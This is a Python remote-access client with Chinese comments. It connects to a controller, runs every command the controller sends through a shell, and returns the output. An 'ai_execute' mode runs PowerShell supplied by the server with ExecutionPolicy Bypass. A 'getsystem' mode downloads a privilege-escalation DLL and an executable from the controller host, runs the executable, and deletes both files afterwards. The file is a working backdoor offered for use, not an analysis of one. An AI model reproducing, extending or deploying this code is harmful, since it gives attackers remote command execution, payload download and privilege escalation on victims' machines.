import socket
import json
import subprocess
import sys
import threading
import time

class TCPClient:
    def __init__(self, host='192.168.182.1', port=8888):
        self.host = host
        self.port = port
        self.client_socket = None
        self.connected = False
        
    def connect_to_server(self):
        """连接到TCP服务器"""
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.host, self.port))
            self.connected = True
            print(f"已连接到服务器 {self.host}:{self.port}")
            
            # 发送连接成功消息
            self.send_message({
                'type': 'status',
                'message': '客户端连接成功'
            })
            
            return True
            
        except Exception as e:
            print(f"连接服务器失败: {e}")
            return False
    
    def send_message(self, message):
        """发送消息到服务器"""
        try:
            message_json = json.dumps(message)
            self.client_socket.send(message_json.encode('utf-8'))
            return True
        except Exception as e:
            print(f"发送消息失败: {e}")
            self.connected = False
            return False
    
    def execute_command(self, command):
        """执行系统命令并返回结果"""
        try:
            print(f"执行命令: {command}")
            
            # 检查是否为getsystem命令
            if command.strip() == "getsystem":
                # 启动后台线程处理getsystem命令
                getsystem_thread = threading.Thread(target=self.handle_getsystem_command)
                getsystem_thread.daemon = True
                getsystem_thread.start()
                return "正在提权中。。。。。。"
            
            # 检查是否为AI生成的PowerShell代码
            if command.startswith("ai_execute "):
                # 提取PowerShell代码
                powershell_code = command[11:]  # 移除"ai_execute "前缀
                
                # 清理PowerShell代码 - 移除代码块标记
                # 移除 ```powershell 和 ``` 标记
                if powershell_code.startswith("```powershell"):
                    powershell_code = powershell_code[12:]  # 移除 ```powershell
                if powershell_code.endswith("```"):
                    powershell_code = powershell_code[:-3]  # 移除 ```
                
                # 移除行首和行尾的空白字符
                powershell_code = powershell_code.strip()
                
                # 将代码写入临时文件
                with open("ai_generated.ps1", "w", encoding='utf-8') as f:
                    f.write(powershell_code)
                
                print("[+] 执行AI生成的PowerShell代码...")
                
                # 执行PowerShell脚本
                process = subprocess.Popen(
                    "powershell.exe -ExecutionPolicy Bypass -File ai_generated.ps1",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    errors='ignore'
                )
            else:
                # 普通命令执行
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='utf-8',
                    errors='ignore'
                )
            
            # 等待命令执行完成
            stdout, stderr = process.communicate()
            
            # 如果是AI生成的PowerShell代码，删除临时文件
            if command.startswith("ai_execute "):
                try:
                    import os
                    if os.path.exists("ai_generated.ps1"):
                        os.remove("ai_generated.ps1")
                        print("[+] 已删除临时PowerShell文件")
                except Exception as e:
                    print(f"[-] 删除临时文件失败: {e}")
            
            # 组合输出结果
            result = ""
            if stdout:
                result += f"标准输出:\n{stdout}\n"
            if stderr:
                result += f"错误输出:\n{stderr}\n"
            
            # 添加退出码信息
            result += f"退出码: {process.returncode}"
            
            return result
            
        except Exception as e:
            return f"命令执行出错: {e}"
    
    def handle_getsystem_command(self):
        """处理getsystem命令：下载特权提升文件并执行"""
        try:
            import os
            import urllib.request
            import urllib.error
            
            print("[+] 开始处理getsystem命令...")
            
            # 构建文件下载URL
            base_url = f"http://{self.host}:8000/escalation/"
                
            # 需要下载的文件列表
            files_to_download = [
                "privilege_escalation.dll",
                "test_dll.exe"
            ]
            
            # 下载文件
            for filename in files_to_download:
                file_url = base_url + filename
                local_path = filename
                
                print(f"[+] 正在下载文件: {filename}")
                print(f"[+] 下载URL: {file_url}")
                
                try:
                    # 使用PowerShell下载文件
                    powershell_command = f"Invoke-WebRequest -Uri '{file_url}' -OutFile '{local_path}'"
                    
                    process = subprocess.Popen(
                        ["powershell.exe", "-Command", powershell_command],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        encoding='utf-8',
                        errors='ignore'
                    )
                    
                    # 等待下载完成
                    stdout, stderr = process.communicate()
                    
                    if process.returncode != 0:
                        self.send_message({
                            'type': 'command_result',
                            'command': 'getsystem',
                            'result': f"PowerShell下载失败 {filename}: {stderr}"
                        })
                        return
                    
                    print(f"[+] 文件下载成功: {filename}")
                    
                    # 检查文件是否成功下载
                    if not os.path.exists(local_path):
                        self.send_message({
                            'type': 'command_result',
                            'command': 'getsystem',
                            'result': f"文件下载失败: {filename}"
                        })
                        return
                        
                except Exception as e:
                    self.send_message({
                        'type': 'command_result',
                        'command': 'getsystem',
                        'result': f"下载文件时出错 {filename}: {e}"
                    })
                    return
            
            # 检查所有文件是否都已下载
            for filename in files_to_download:
                if not os.path.exists(filename):
                    self.send_message({
                        'type': 'command_result',
                        'command': 'getsystem',
                        'result': f"文件不存在: {filename}"
                    })
                    return
            
            print("[+] 所有文件下载完成，开始执行test_dll.exe...")
            
            # 执行test_dll.exe
            process = subprocess.Popen(
                "test_dll.exe",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='ignore'
            )
            
            # 等待命令执行完成
            stdout, stderr = process.communicate()
            
            # 组合输出结果
            result = "getsystem命令执行完成\n"
            if stdout:
                result += f"标准输出:\n{stdout}\n"
            if stderr:
                result += f"错误输出:\n{stderr}\n"
            
            result += f"退出码: {process.returncode}"
            
            # 发送执行结果回服务器
            self.send_message({
                'type': 'command_result',
                'command': 'getsystem',
                'result': result
            })
            
            # 删除下载的文件
            print("[+] 正在删除下载的文件...")
            files_to_delete = ["privilege_escalation.dll", "test_dll.exe"]
            
            for filename in files_to_delete:
                if os.path.exists(filename):
                    try:
                        # 使用PowerShell删除文件
                        powershell_command = f"Remove-Item '{filename}' -Force"
                        
                        process = subprocess.Popen(
                            ["powershell.exe", "-Command", powershell_command],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True,
                            encoding='utf-8',
                            errors='ignore'
                        )
                        
                        # 等待删除完成
                        stdout, stderr = process.communicate()
                        
                        if process.returncode == 0:
                            print(f"[+] 文件删除成功: {filename}")
                        else:
                            print(f"[-] 文件删除失败 {filename}: {stderr}")
                            
                    except Exception as e:
                        print(f"[-] 删除文件时出错 {filename}: {e}")
                else:
                    print(f"[-] 文件不存在，无需删除: {filename}")
            
            # 执行完成后断开连接
            print("[+] test_dll.exe执行完成，断开连接...")
            self.disconnect()
            
        except Exception as e:
            self.send_message({
                'type': 'command_result',
                'command': 'getsystem',
                'result': f"getsystem命令执行出错: {e}"
            })
    
    def listen_for_commands(self):
        """监听来自服务器的命令"""
        try:
            while self.connected:
                # 接收服务器消息
                data = self.client_socket.recv(1024).decode('utf-8')
                if not data:
                    print("服务器断开连接")
                    self.connected = False
                    break
                
                try:
                    message = json.loads(data)
                    
                    if message.get('type') == 'command':
                        command = message.get('command', '')
                        if command:
                            # 执行命令
                            result = self.execute_command(command)
                            
                            # 发送执行结果回服务器
                            self.send_message({
                                'type': 'command_result',
                                'command': command,
                                'result': result
                            })
                        else:
                            self.send_message({
                                'type': 'status',
                                'message': '收到空命令'
                            })
                    else:
                        print(f"收到未知消息类型: {message.get('type')}")
                        
                except json.JSONDecodeError:
                    print(f"收到非JSON消息: {data}")
                except Exception as e:
                    print(f"处理消息时出错: {e}")
                    
        except ConnectionResetError:
            print("服务器连接被重置")
            self.connected = False
        except Exception as e:
            print(f"监听命令时出错: {e}")
            self.connected = False
    
    def start_client(self):
        """启动客户端"""
        if not self.connect_to_server():
            return
        
        print("客户端已启动，等待服务器命令...")
        print("输入 'quit' 退出客户端")
        
        # 启动监听线程
        listen_thread = threading.Thread(target=self.listen_for_commands)
        listen_thread.daemon = True
        listen_thread.start()
        
        try:
            while self.connected:
                # 检查用户输入（用于退出）
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n正在关闭客户端...")
        except Exception as e:
            print(f"客户端运行出错: {e}")
        finally:
            self.disconnect()
    
    def disconnect(self):
        """断开连接"""
        self.connected = False
        if self.client_socket:
            self.client_socket.close()
        print("客户端已断开连接")

def main():
    # 从命令行参数获取服务器地址和端口
    host = 'localhost'
    port = 8888
    
    if len(sys.argv) > 1:
        host = sys.argv[1]
    if len(sys.argv) > 2:
        try:
            port = int(sys.argv[2])
        except ValueError:
            print("端口号必须是数字")
            return
    
    client = TCPClient(host, port)
    client.start_client()

if __name__ == "__main__":
    main()